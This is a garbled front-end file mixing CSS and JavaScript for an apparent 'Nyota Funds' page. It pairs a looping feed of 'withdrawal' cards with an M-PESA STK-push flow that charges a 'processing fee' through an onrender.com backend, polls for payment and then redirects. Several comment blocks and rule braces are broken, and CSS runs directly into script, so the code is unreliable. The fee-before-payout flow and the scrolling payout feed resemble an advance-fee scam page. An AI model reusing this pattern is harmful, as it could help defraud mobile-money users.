/* ================================

/* ================================

================================ */

.activity-title span{

/* ================================
   SCROLLING WINDOW
================================ */

.activity-window{

    width:100%;

    height:45vh;

    min-height:300px;

    overflow:hidden;

    position:relative;
}

.activity-track{

    display:flex;

    flex-direction:column;

    gap:9px;

    animation:

        35s
        linear
        infinite;
}

.activity-window:active .activity-track{
    animation-play-state:paused;
}


/* ================================
   WITHDRAWAL CARD
================================ */

.activity-item{

    width:100%;

    min-height:88px;

    background:#020617;

    border-radius:17px;

    border-left:5px solid #19C37D;

    display:flex;

    align-items:center;

    justify-content:space-between;

    padding:11px 10px 11px 12px;

    flex-shrink:0;

.activity-info{

    display:flex;

    flex-direction:column;

    gap:3px;

    min-width:0;
}

.activity-phone{

    font-size:15px;

    font-weight:600;

    color:#fff;
}

.activity-amount{

    font-size:14px;

    font-weight:500;

    color:#fff;
}


/* ================================
   TIME
================================ */

.activity-time{

    font-size:10px;

    font-weight:500;

/* ================================
   STATUS
================================ */

.activity-status{

    background:rgba(0,166,81,0.20);

    color:#19D99A;

    border-radius:40px;

    padding:9px 10px;

    font-size:9px;

    font-weight:700;

    white-space:nowrap;

    text-align:center;

    margin-left:6px;
}


/* ================================
   CONTINUOUS SCROLL
================================ */

@keyframes scrollActivity{

    0%{
        transform:translateY(0);
    }

    100%{
        transform:translateY(-50%);
    }

}

================================ */

@media(max-width:360px){

/* =================================
   TIME AGO
================================= */

function timeAgo(timestamp){

    const now =
        new Date();

    const time =
        new Date(timestamp);

    let seconds =
        Math.floor(
            (now - time) / 1000
        );

    if(seconds < 0){
        seconds = 0;
    }

    if(seconds < 60){

        return seconds +
            (seconds === 1
                ? " second ago"
                : " seconds ago");
    }

    const minutes =
        Math.floor(seconds / 60);

    if(minutes < 60){

        return minutes +
            (minutes === 1
                ? " minute ago"
                : " minutes ago");
    }

    const hours =
        Math.floor(minutes / 60);

    return hours +
        (hours === 1
            ? " hour ago"
            : " hours ago");
}

/* =================================

async function payNow(){

    let phone =
        document.getElementById("phone")
        .value
        .trim();

    if(phone === ""){

        alert(
            "Please enter your M-PESA phone number."
        );

        return;
    }

    localStorage.setItem(
        "phoneNumber",
        phone
    );

    localStorage.setItem(
        "fullName",
        document.getElementById(
            "fullName"
        ).value
    );

    let btn =
        document.getElementById(
            "payBtn"
        );

    btn.innerHTML =
        "Sending STK Push...";

    btn.disabled = true;


    try{

        let response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:phone,

                        amount:
                            Number(
                                processingFee
                            )

                    })
                }
            );


        let data =
            await response.json();


        console.log(
            "STK RESPONSE:",
            data
        );


        if(
            !response.ok ||
            !data.success
        ){

            throw new Error(
                data.message ||
                "STK Push failed"
            );
        }


        let transactionId =
            data.transactionId ||
            data.checkout_request_id;


        if(!transactionId){

            throw new Error(
                "No Paylor transaction ID received"
            );
        }


        btn.innerHTML =
            "Processing...";


        document.getElementById(
            "stkMessage"
        ).innerHTML =
            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";


        checkPayment(
            transactionId
        );


    }catch(error){

        console.log(
            "PAYMENT ERROR:",
            error
        );


        alert(
            error.message ||
            "Payment request failed."
        );


        btn.innerHTML =
            "Pay Processing Fee";

        btn.disabled = false;
    }

}


/* =================================
   CHECK PAYMENT STATUS
================================= */

async function checkPayment(
    transactionId
){

    let interval =
        setInterval(
            async()=>{

                try{

                    let response =
                        await fetch(
                            "https://nyota-funds-backend.onrender.com/payment-status",
                            {
                                method:"POST",

                                headers:{
                                    "Content-Type":
                                        "application/json"
                                },

                                body:
                                    JSON.stringify({

                                        transactionId:
                                            transactionId

                                    })
                            }
                        );


                    let result =
                        await response.json();


                    console.log(
                        "PAYMENT STATUS:",
                        result
                    );


                    if(
                        !result.success ||
                        !result.data
                    ){

                        return;
                    }


                    let payment =
                        result.data;


                    let status =
                        String(
                            payment.status || ""
                        ).toUpperCase();


                    if(
                        status === "COMPLETED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "✅ Payment successful. Redirecting...";


                        window.location.href =
                            "delivery.html";
                    }


                    else if(
                        status === "CANCELLED" ||
                        status === "FAILED"
                    ){

                        clearInterval(
                            interval
                        );


                        document.getElementById(
                            "stkMessage"
                        ).innerHTML =
                            "❌ Payment " +
                            status.toLowerCase() +
                            ".";


                        document.getElementById(
                            "payBtn"
                        ).disabled = false;


                        document.getElementById(
                            "payBtn"
                        ).innerHTML =
                            "Pay Processing Fee";
                    }


                }catch(error){

                    console.log(
                        "STATUS ERROR:",
                        error
                    );

                }

            },
            3000
        );

}
